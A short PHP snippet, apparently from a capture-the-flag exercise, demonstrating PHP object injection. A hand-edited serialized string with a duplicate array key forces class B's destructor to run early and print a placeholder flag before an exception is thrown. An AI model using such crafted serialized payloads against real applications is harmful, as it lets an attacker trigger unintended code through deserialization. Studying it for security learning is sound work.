<?php

$flag = "fake_flag";
class B {
    function __destruct() {
      global $flag;
      echo $flag;
    }
  }
//echo serialize(array(1 => new B(), 2 => 2));

// serialized: a:2:{i:1;O:1:"B":0:{}i:2;i:2;}

// sau khi chỉnh sửa: a:2:{i:1;O:1:"B":0:{}i:1;i:2;}

unserialize('a:2:{i:1;O:1:"B":0:{}i:1;i:2;}');
throw("CC");